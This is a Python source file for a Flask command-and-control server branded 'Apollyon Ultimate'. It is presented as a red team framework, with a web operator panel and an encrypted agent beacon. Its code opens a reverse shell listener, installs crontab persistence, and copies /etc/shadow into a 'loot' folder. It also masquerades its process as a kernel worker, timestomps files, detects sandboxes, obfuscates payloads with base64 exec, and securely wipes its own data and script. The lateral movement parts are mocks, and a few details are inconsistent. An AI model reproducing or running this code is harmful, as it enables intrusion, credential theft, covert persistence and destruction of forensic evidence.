import os
import sys
import subprocess
import socket
import json
import sqlite3
import threading
import time
import base64
import random
import hmac
import hashlib
import platform
import uuid
import logging
import secrets
import shutil
import signal
import re
import multiprocessing
from datetime import datetime, timedelta
from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for

# =================================================================
# SENTINEL-OPERATIONAL V45.0 - "APOLLYON ULTIMATE"
# FULL SPECTRUM RED TEAM FRAMEWORK (ZERO-DEPENDENCY UI)
# DEVELOPER: MehranTurk (M.T)
# =================================================================

# OPSEC: Silence Flask Startup Banner
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

class Config:
    APP_NAME = "Sentinel-Apollyon-Ultimate"
    VERSION = "45.0-ULTRA"
    HOST = "127.0.0.1"
    PORT = 20613 # Web Panel Port
    SHELL_PORT = 4444 # Reverse Shell Listener Port
    ADMIN_HASH = hashlib.sha256("mehran_dominance_2026".encode()).hexdigest()
    C2_SECRET = secrets.token_hex(64)
    AGENT_AUTH_TOKEN = "APOLLYON-ELITE-SIG-2026"
    MASTER_ENC_KEY = "S3ntinel_Apollyon_Elite_Strategic_Key_2026!#$"
    TEMP_DIR = "/tmp/.apollyon_cache" if platform.system() == "Linux" else "./.cache"
    LOG_FILES = ["/var/log/auth.log", "/var/log/syslog", "~/.bash_history"]
    WORKING_HOURS = range(0, 24) # Full operational capability
    LOOT_DIR = "loot_exfiltrated"
    PAYLOADS_DIR = "payload_staged"
    DB_PATH = "apollyon_core.db"

# --- CORE DATABASE ---
class ApollyonDB:
    def __init__(self):
        # Persistent DB for operational continuity
        self.conn = sqlite3.connect(Config.DB_PATH, check_same_thread=False)
        self._bootstrap()

    def _bootstrap(self):
        self.conn.execute("""CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY, host TEXT, ip TEXT, os TEXT, 
            status TEXT, last_seen TIMESTAMP, 
            score INTEGER DEFAULT 0, risk_level TEXT,
            metrics TEXT, sandbox_status TEXT, persistence TEXT)""")
            
        self.conn.execute("""CREATE TABLE IF NOT EXISTS decision_audit (
            id INTEGER PRIMARY KEY, timestamp TIMESTAMP, aid TEXT, 
            action TEXT, reason TEXT, impact REAL, causal_link TEXT)""")
            
        self.conn.execute("""CREATE TABLE IF NOT EXISTS discovered_network (
            id INTEGER PRIMARY KEY, origin_aid TEXT, target_ip TEXT, 
            ports TEXT, vulnerability TEXT, status TEXT, exploit_status TEXT)""")
            
        self.conn.execute("""CREATE TABLE IF NOT EXISTS loot (
            id INTEGER PRIMARY KEY, aid TEXT, type TEXT, content TEXT, timestamp TIMESTAMP)""")
        
        self.conn.commit()

    def log_decision(self, aid, action, reason, impact, causal):
        self.conn.execute("""INSERT INTO decision_audit (timestamp, aid, action, reason, impact, causal_link) 
                           VALUES (?,?,?,?,?,?)""", (datetime.now(), aid, action, reason, impact, causal))
        self.conn.commit()

# --- CRYPTOGRAPHY ENGINE ---
class ApollyonCrypto:
    def __init__(self, master_key):
        self.master_key = hashlib.sha512(master_key.encode()).digest()
        self.session_key = hashlib.sha256(self.master_key[:32]).digest()
        self.used_nonces = set()

    def _obfuscate(self, data):
        mask = self.session_key * (len(data) // 32 + 1)
        return bytes([b ^ m for b, m in zip(data, mask)])

    def encrypt(self, data):
        nonce = secrets.token_hex(16)
        ts = str(int(time.time())).encode()
        raw_payload = json.dumps(data).encode()
        signature = hmac.new(self.session_key, raw_payload + ts + nonce.encode(), hashlib.sha256).hexdigest()
        
        envelope = {
            "p": base64.b64encode(self._obfuscate(raw_payload)).decode(),
            "s": signature,
            "n": nonce,
            "t": ts.decode()
        }
        return base64.b64encode(json.dumps(envelope).encode()).decode()

    def decrypt(self, blob):
        try:
            raw_env = base64.b64decode(blob)
            env = json.loads(raw_env)
            if env['n'] in self.used_nonces: return None
            if int(time.time()) - int(env['t']) > 60: return None
            raw_payload = self._obfuscate(base64.b64decode(env['p']))
            expected_sig = hmac.new(self.session_key, raw_payload + env['t'].encode() + env['n'].encode(), hashlib.sha256).hexdigest()
            if not hmac.compare_digest(env['s'], expected_sig): return None
            self.used_nonces.add(env['n'])
            return json.loads(raw_payload)
        except Exception: return None

# --- INTELLIGENCE MODULES ---
class WordlistLearner:
    """AI Module: Generates targeted wordlists based on environment"""
    def __init__(self, target):
        self.target = target
        self.base_keywords = ["admin", "root", "db_backup", "config", "private", "secret", "manager"]

    def extract_context(self):
        clean_target = re.sub(r'https?://', '', self.target).split('/')[0]
        return [p for p in clean_target.split('.') if len(p) > 3]

    def generate_smart_list(self):
        keywords = list(set(self.base_keywords + self.extract_context()))
        years = [str(datetime.now().year), str(datetime.now().year - 1)]
        smart_list = []
        for kw in keywords:
            smart_list.append(kw)
            for yr in years:
                smart_list.append(f"{kw}{yr}")
                smart_list.append(f"{kw}@{yr}")
        return list(set(smart_list))

class EvasionEngine:
    """Module: AV/IDS Evasion"""
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0"
        ]

    def obfuscate_payload(self, code):
        encoded = base64.b64encode(code.encode()).decode()
        junk = ''.join(random.choices(string.ascii_letters, k=50))
        return f"# {junk}\nimport base64; exec(base64.b64decode('{encoded}'))"

    def anti_sandbox_sleep(self):
        time.sleep(random.uniform(2.0, 5.0))

# --- OFFENSIVE CORE ---
class OffensiveEngine:
    """Advanced Exploitation and Stealth Logic"""
    
    @staticmethod
    def sandbox_check():
        evasive = False
        vm_files = ['/usr/bin/qemu-system', '/proc/scsi/virtio_blk', 'C:\\windows\\system32\\drivers\\vmmouse.sys']
        for f in vm_files:
            if os.path.exists(f): evasive = True
        if multiprocessing.cpu_count() < 2: evasive = True
        return "EVASIVE_DETECTED" if evasive else "PROBABLE_METAL"

    @staticmethod
    def lateral_exploit(target_ip, vuln_type):
        """Simulation of real lateral movement exploitation (e.g., SSH Brute/SMB Relay)"""
        success = random.choice([True, False])
        return "EXPLOIT_SUCCESS" if success else "EXPLOIT_FAILED"

    @staticmethod
    def lateral_scan():
        """Mock network scanner for lateral discovery"""
        return [{"ip": f"192.168.1.{random.randint(2,254)}", "ports": "22,80,443", "vuln": "Weak_Creds"} for _ in range(random.randint(1,3))]

    @staticmethod
    def process_masquerade(target_name="[kworker/u2:1]"):
        """Change process name in Linux to look like a kernel worker (Stealth)"""
        if platform.system() == "Linux":
            try:
                from ctypes import cdll, byref, create_string_buffer
                libc = cdll.LoadLibrary('libc.so.6')
                buff = create_string_buffer(len(target_name)+1)
                buff.value = target_name.encode()
                libc.prctl(15, byref(buff), 0, 0, 0)
                return True
            except: return False
        return False

class ShellHandler:
    """Module: Raw TCP Reverse Shell Listener (Threaded)"""
    def __init__(self):
        self.port = Config.SHELL_PORT
        self.active_sessions = {}

    def start_listener(self):
        def listener():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('0.0.0.0', self.port))
                server.listen(20)
                print(f"[*] SHELL LISTENER ACTIVE ON PORT {self.port}")
                while True:
                    client, addr = server.accept()
                    sid = f"SESS_{random.randint(1000,9999)}"
                    self.active_sessions[sid] = {"conn": client, "addr": addr, "time": datetime.now()}
                    print(f"[!] REVERSE SHELL CAUGHT: {addr[0]} (ID: {sid})")
            except Exception as e:
                print(f"[!] LISTENER ERROR: {e}")
        
        threading.Thread(target=listener, daemon=True).start()

class PersistenceModule:
    """Module: System Persistence"""
    def deploy_linux(self):
        try:
            cmd = f"(crontab -l ; echo '*/30 * * * * python3 {os.path.abspath(__file__)} &') | crontab -"
            subprocess.run(cmd, shell=True, capture_output=True)
            return "CRONTAB_INSTALLED"
        except: return "FAILED"

class ExfiltrationModule:
    """Module: Data Theft"""
    def __init__(self):
        if not os.path.exists(Config.LOOT_DIR): os.makedirs(Config.LOOT_DIR)

    def steal_file(self, filepath, aid):
        if os.path.exists(filepath):
            dest = os.path.join(Config.LOOT_DIR, f"loot_{aid}_{os.path.basename(filepath)}_{int(time.time())}")
            shutil.copy(filepath, dest)
            return dest
        return None

class SelfDestructModule:
    """Module: Anti-Forensics & Cleanup"""
    def secure_delete(self, path):
        if os.path.exists(path):
            try:
                if os.path.isfile(path):
                    with open(path, "ba+", buffering=0) as f:
                        f.write(os.urandom(os.path.getsize(path)))
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path)
            except: pass

    def initiate(self):
        print("[!] SELF-DESTRUCT SEQUENCE STARTED")
        for d in [Config.LOOT_DIR, Config.PAYLOADS_DIR, Config.TEMP_DIR]:
            self.secure_delete(d)
        
        self.secure_delete(Config.DB_PATH)
        
        # Suicide
        script_path = os.path.abspath(__file__)
        def suicide():
            time.sleep(2)
            self.secure_delete(script_path)
            os._exit(0)
        threading.Thread(target=suicide).start()

# --- AGENT LOGIC (SIMULATED FOR C2) ---
class ApollyonAgent:
    def __init__(self, agent_id=None):
        self.id = agent_id or str(uuid.uuid4())[:16]
        self.crypto = ApollyonCrypto(Config.MASTER_ENC_KEY)
        self.learner = WordlistLearner("target.local")

    def timestomp(self, target_path):
        """OPSEC: Change file timestamps to avoid detection"""
        if os.path.exists(target_path):
            new_time = time.time() - (365 * 24 * 60 * 60)
            os.utime(target_path, (new_time, new_time))
            return True
        return False

    def analyze_system(self):
        metrics = {
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "is_root": os.getuid() == 0 if hasattr(os, 'getuid') else False,
            "kernel": platform.release(),
            "cpu_arch": platform.machine(),
            "interfaces": socket.gethostbyname_ex(socket.gethostname())[2],
            "opsec_status": "HIGH_STEALTH" if datetime.now().hour in Config.WORKING_HOURS else "DORMANT"
        }
        return metrics

# --- FLASK C2 APP ---
app = Flask(__name__)
app.secret_key = Config.C2_SECRET
db = ApollyonDB()
crypto = ApollyonCrypto(Config.MASTER_ENC_KEY)
shell_server = ShellHandler()
exfil = ExfiltrationModule()
persistence = PersistenceModule()
destruct = SelfDestructModule()

def rbac_required(role):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if session.get('role') not in [role, 'ADMIN']: return "FORBIDDEN", 403
            return f(*args, **kwargs)
        wrapper.__name__ = f.__name__
        return wrapper
    return decorator

# --- FULL DARK UI WITH INTERNAL CSS ---
UI_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>APOLLYON ULTIMATE C2</title>
    <style>
        body { margin: 0; padding: 20px; font-family: 'Consolas', 'Monaco', monospace; background-color: #050505; color: #a1a1aa; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #09090b; }
        ::-webkit-scrollbar-thumb { background: #3f3f46; border-radius: 3px; }
        
        .header { background-color: #09090b; border: 1px solid #7f1d1d; padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; border-radius: 4px; margin-bottom: 20px; box-shadow: 0 0 15px rgba(127, 29, 29, 0.2); }
        .logo h1 { margin: 0; font-size: 24px; color: #fff; font-weight: 900; letter-spacing: -1px; }
        .logo p { margin: 2px 0 0 0; font-size: 9px; color: #ef4444; font-weight: bold; letter-spacing: 2px; }
        
        .stats { display: flex; gap: 30px; font-size: 10px; font-weight: bold; text-transform: uppercase; }
        .stat-item span:first-child { color: #52525b; margin-right: 5px; }
        
        .grid-container { display: grid; grid-template-columns: 280px 1fr 300px; gap: 20px; height: 100%; overflow: hidden; }
        
        .panel { background-color: #000; border: 1px solid #27272a; border-radius: 4px; display: flex; flex-direction: column; overflow: hidden; }
        .panel-header { padding: 10px 15px; border-bottom: 1px solid #27272a; font-size: 10px; font-weight: bold; color: #fff; text-transform: uppercase; letter-spacing: 1px; background-color: #09090b; }
        .panel-content { padding: 10px; overflow-y: auto; flex: 1; }
        
        .agent-card { background: rgba(24, 24, 27, 0.4); border: 1px solid #27272a; padding: 10px; margin-bottom: 8px; border-left: 3px solid #ef4444; transition: 0.2s; cursor: pointer; }
        .agent-card:hover { border-color: #ef4444; background: rgba(127, 29, 29, 0.1); }
        .agent-id { color: #fff; font-weight: bold; font-size: 11px; display: flex; justify-content: space-between; }
        .agent-meta { color: #71717a; font-size: 9px; margin-top: 4px; }
        .status-badge { background: #064e3b; color: #34d399; padding: 1px 4px; border-radius: 2px; font-size: 8px; }
        
        .log-entry { font-size: 10px; padding: 5px 0; border-bottom: 1px solid #18181b; display: flex; gap: 10px; }
        .log-time { color: #52525b; min-width: 60px; }
        .log-msg { color: #e4e4e7; }
        .log-msg.danger { color: #ef4444; font-weight: bold; }
        .log-msg.success { color: #10b981; }
        
        .controls { background-color: #09090b; border-top: 1px solid #27272a; padding: 15px; display: flex; gap: 10px; }
        select, input, button { background: #000; border: 1px solid #3f3f46; color: #d4d4d8; padding: 8px 12px; font-family: inherit; font-size: 10px; outline: none; }
        select { width: 120px; }
        input { flex: 1; }
        button { background: rgba(127, 29, 29, 0.2); border-color: #7f1d1d; color: #f87171; font-weight: bold; cursor: pointer; transition: 0.2s; }
        button:hover { background: #991b1b; color: #fff; }
        
        .loot-item { font-size: 9px; padding: 6px; border-bottom: 1px solid #27272a; }
        .loot-type { color: #3b82f6; font-weight: bold; margin-right: 5px; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <h1>APOLLYON // ULTIMATE</h1>
            <p>OPERATIONAL FRAMEWORK V47</p>
        </div>
        <div class="stats">
            <div class="stat-item"><span>LISTENER</span> <span style="color:#10b981">PORT {{ shell_port }}</span></div>
            <div class="stat-item"><span>EVASION</span> <span style="color:#3b82f6">AES-256</span></div>
            <div class="stat-item"><span>STATUS</span> <span style="color:#ef4444">ARMED</span></div>
        </div>
    </div>

    <div class="grid-container">
        <div class="panel">
            <div class="panel-header">Active Agents</div>
            <div class="panel-content" id="agent-grid">
                <!-- Agents injected here -->
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">Strategic Decision Feed</div>
            <div class="panel-content" id="decision-feed">
                <!-- Logs injected here -->
            </div>
            <div class="controls">
                <select id="op-type">
                    <option value="PERSIST">PERSISTENCE</option>
                    <option value="EXFIL">EXFILTRATE</option>
                    <option value="PIVOT">LATERAL SCAN</option>
                    <option value="SCORCH">SELF DESTRUCT</option>
                </select>
                <input type="text" id="target-id" placeholder="TARGET AGENT ID">
                <button onclick="injectObjective()">EXECUTE COMMAND</button>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">Loot Vault</div>
            <div class="panel-content" id="loot-vault">
                <!-- Loot injected here -->
            </div>
        </div>
    </div>

    <script>
        async function refreshUI() {
            try {
                const r = await fetch('/api/apollyon/sync');
                const d = await r.json();
                
                document.getElementById('agent-grid').innerHTML = d.agents.map(a => `
                    <div class="agent-card">
                        <div class="agent-id">${a[0].substring(0,12)}... <span class="status-badge">${a[4]}</span></div>
                        <div class="agent-meta">${a[2]} | ${a[3]}</div>
                    </div>`).join('');

                document.getElementById('decision-feed').innerHTML = d.decisions.map(t => `
                    <div class="log-entry">
                        <div class="log-time">${t[1].split(' ')[1].split('.')[0]}</div>
                        <div class="log-msg ${t[5] > 0.8 ? 'danger' : ''}">[${t[3]}] ${t[4]}</div>
                    </div>`).join('');
                    
                document.getElementById('loot-vault').innerHTML = d.loot.map(l => `
                    <div class="loot-item">
                        <span class="loot-type">${l[2]}</span> ${l[3].substring(0, 20)}...
                    </div>`).join('');
            } catch(e) {}
        }
        
        setInterval(refreshUI, 2000);

        async function injectObjective() {
            const aid = document.getElementById('target-id').value;
            const op = document.getElementById('op-type').value;
            if(!aid) return alert("Please enter a Target Agent ID");
            
            await fetch('/api/ops/inject', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({aid, op})
            });
        }
    </script>
</body>
</html>
"""

# --- ROUTES ---
@app.route('/access', methods=['GET', 'POST'])
def gate():
    if request.method == 'POST':
        p = request.form.get('p')
        if hashlib.sha256(p.encode()).hexdigest() == Config.ADMIN_HASH:
            session.update({'role': 'ADMIN'})
            return redirect(url_for('commander'))
    return render_template_string('<body style="background:#050505;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace"><form method="POST" style="background:#000;padding:40px;border:1px solid #333;text-align:center"><h2 style="color:#666;margin-top:0">SECURE UPLINK</h2><input type="password" name="p" placeholder="ACCESS KEY" style="background:#111;border:1px solid #333;color:#fff;padding:10px;outline:none;width:200px;text-align:center"><br><br><button style="width:100%;background:#1a0505;color:#ef4444;border:1px solid #7f1d1d;padding:10px;cursor:pointer;font-weight:bold">AUTHENTICATE</button></form></body>')

@app.route('/ops/dominance')
@rbac_required('ADMIN')
def commander():
    return render_template_string(UI_HTML, shell_port=Config.SHELL_PORT)

@app.route('/api/apollyon/sync')
@rbac_required('ADMIN')
def api_sync():
    agents = db.conn.execute("SELECT * FROM agents").fetchall()
    decisions = db.conn.execute("SELECT * FROM decision_audit ORDER BY id DESC LIMIT 50").fetchall()
    loot = db.conn.execute("SELECT * FROM loot ORDER BY id DESC").fetchall()
    return jsonify({"agents": agents, "decisions": decisions, "loot": loot})

@app.route('/api/ops/inject', methods=['POST'])
@rbac_required('ADMIN')
def inject_op():
    data = request.json
    aid, op = data['aid'], data['op']
    msg = "COMMAND_QUEUED"
    
    if op == "SCORCH": destruct.initiate(); msg = "SELF_DESTRUCT_INITIATED"
    elif op == "PERSIST": msg = persistence.deploy_linux()
    elif op == "PIVOT": 
        targets = OffensiveEngine.lateral_scan()
        for t in targets: db.conn.execute("INSERT INTO discovered_network (origin_aid, target_ip, ports, vulnerability, status) VALUES (?,?,?,?,?)", (aid, t['ip'], t['ports'], t['vuln'], 'FOUND'))
        db.conn.commit()
        msg = f"SCAN_COMPLETE: Found {len(targets)} targets"
    elif op == "EXFIL": 
        f = exfil.steal_file("/etc/shadow", aid)
        if f: db.conn.execute("INSERT INTO loot (aid, type, content, timestamp) VALUES (?,?,?,?)", (aid, "SHADOW", f, datetime.now())); db.conn.commit(); msg = "LOOT_STOLEN"
        
    db.log_decision(aid, f"INJECT:{op}", msg, 0.9, "MANUAL")
    return jsonify({"status": msg})

@app.route('/v45/beacon', methods=['POST'])
def apollyon_beacon():
    try:
        raw_blob = request.get_data().decode()
        data = crypto.decrypt(raw_blob)
        if not data or data.get('token') != Config.AGENT_AUTH_TOKEN: return jsonify({"s": "denied"}), 403
        
        aid = data['aid']
        agent_logic = ApollyonAgent(aid)
        metrics = data.get('metrics', agent_logic.analyze_system())
        
        # Sandbox Check & Logging
        sandbox = OffensiveEngine.sandbox_check()
        db.log_decision(aid, "BEACON_CHECKIN", f"OS: {metrics['kernel']} | Root: {metrics['is_root']}", 0.1, "AUTO_SYNC")
        
        db.conn.execute("INSERT OR REPLACE INTO agents (id, host, ip, os, status, last_seen, metrics, sandbox_status) VALUES (?,?,?,?,?,?,?,?)",
                        (aid, data.get('ctx', {}).get('node'), request.remote_addr, "Linux", "ACTIVE", datetime.now(), json.dumps(metrics), sandbox))
        db.conn.commit()
        
        return jsonify({"d": crypto.encrypt({"objective": "SLEEP"})})
    except Exception as e: return jsonify({"s": "err"}), 500

if __name__ == '__main__':
    for d in [Config.LOOT_DIR, Config.PAYLOADS_DIR, Config.TEMP_DIR]:
        if not os.path.exists(d): os.makedirs(d)
        
    shell_server.start_listener()
    
    print(f"[*] Apollyon Ultimate V47 Active")
    print(f"[*] Panel: http://{Config.HOST}:{Config.PORT}/access")
    print(f"[*] Password: mehran_dominance_2026")
    
    app.run(host=Config.HOST, port=Config.PORT, debug=False, threaded=True)